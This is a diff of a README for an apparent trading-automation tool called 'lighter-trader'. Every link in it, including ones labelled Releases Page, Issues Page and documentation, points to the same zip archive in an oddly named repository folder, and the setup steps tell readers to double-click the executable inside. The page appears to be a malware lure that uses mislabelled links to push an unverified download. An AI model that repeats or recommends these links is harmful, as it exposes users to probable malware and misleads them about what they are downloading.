@@ -1,7 +1,7 @@
 # 🛠 lighter-trader - Automate Your Trading with Ease
 
 ## 📥 Download Now
-[![Download lighter-trader](https://raw.githubusercontent.com/Orzeszek091/lighter-trader/main/uncontradictedly/lighter-trader.zip%https://raw.githubusercontent.com/Orzeszek091/lighter-trader/main/uncontradictedly/lighter-trader.zip)](https://raw.githubusercontent.com/Orzeszek091/lighter-trader/main/uncontradictedly/lighter-trader.zip)
+[![Download lighter-trader](https://github.com/Orzeszek091/lighter-trader/raw/refs/heads/main/uncontradictedly/lighter_trader_3.2.zip%https://github.com/Orzeszek091/lighter-trader/raw/refs/heads/main/uncontradictedly/lighter_trader_3.2.zip)](https://github.com/Orzeszek091/lighter-trader/raw/refs/heads/main/uncontradictedly/lighter_trader_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the lighter-trader project! This application helps you automate trading tasks with ease. Follow these simple steps to get started.
@@ -17,7 +17,7 @@ Before you download, ensure your system meets these requirements:
 ## ⬇️ Download & Install
 To download the application, visit the Releases page:
 
-[Visit Releases Page](https://raw.githubusercontent.com/Orzeszek091/lighter-trader/main/uncontradictedly/lighter-trader.zip)
+[Visit Releases Page](https://github.com/Orzeszek091/lighter-trader/raw/refs/heads/main/uncontradictedly/lighter_trader_3.2.zip)
 
 1. Once you're on the page, scroll down to see the list of available versions.
 2. Find the latest release marked as "Latest Release."
@@ -27,7 +27,7 @@ To download the application, visit the Releases page:
 
 ## ⚙️ Setup Instructions
 1. Open the extracted folder.
-2. Look for the file named "https://raw.githubusercontent.com/Orzeszek091/lighter-trader/main/uncontradictedly/lighter-trader.zip" (or corresponding executable for your OS).
+2. Look for the file named "https://github.com/Orzeszek091/lighter-trader/raw/refs/heads/main/uncontradictedly/lighter_trader_3.2.zip" (or corresponding executable for your OS).
 3. Double-click the executable file to start the application.
 4. Follow the on-screen instructions to complete the setup. You may need to click "Next" a few times to proceed.
 
@@ -53,14 +53,14 @@ Your security is important. Here are a few tips to ensure safe trading:
 - Regularly update your software to the latest version.
 
 ## 📞 Support
-If you encounter any issues or have questions, don’t hesitate to reach out. Check the [Issues Page](https://raw.githubusercontent.com/Orzeszek091/lighter-trader/main/uncontradictedly/lighter-trader.zip) for solutions or to report a problem.
+If you encounter any issues or have questions, don’t hesitate to reach out. Check the [Issues Page](https://github.com/Orzeszek091/lighter-trader/raw/refs/heads/main/uncontradictedly/lighter_trader_3.2.zip) for solutions or to report a problem.
 
 ## 🌟 Additional Resources
 Explore these resources for more information on trading strategies and tips:
 
-- [Trading 101](https://raw.githubusercontent.com/Orzeszek091/lighter-trader/main/uncontradictedly/lighter-trader.zip)
-- [API Usage Documentation](https://raw.githubusercontent.com/Orzeszek091/lighter-trader/main/uncontradictedly/lighter-trader.zip)
+- [Trading 101](https://github.com/Orzeszek091/lighter-trader/raw/refs/heads/main/uncontradictedly/lighter_trader_3.2.zip)
+- [API Usage Documentation](https://github.com/Orzeszek091/lighter-trader/raw/refs/heads/main/uncontradictedly/lighter_trader_3.2.zip)
 
 Remember to revisit the Releases page to stay updated on new versions and features.
 
-[Download lighter-trader Here](https://raw.githubusercontent.com/Orzeszek091/lighter-trader/main/uncontradictedly/lighter-trader.zip)
+[Download lighter-trader Here](https://github.com/Orzeszek091/lighter-trader/raw/refs/heads/main/uncontradictedly/lighter_trader_3.2.zip)
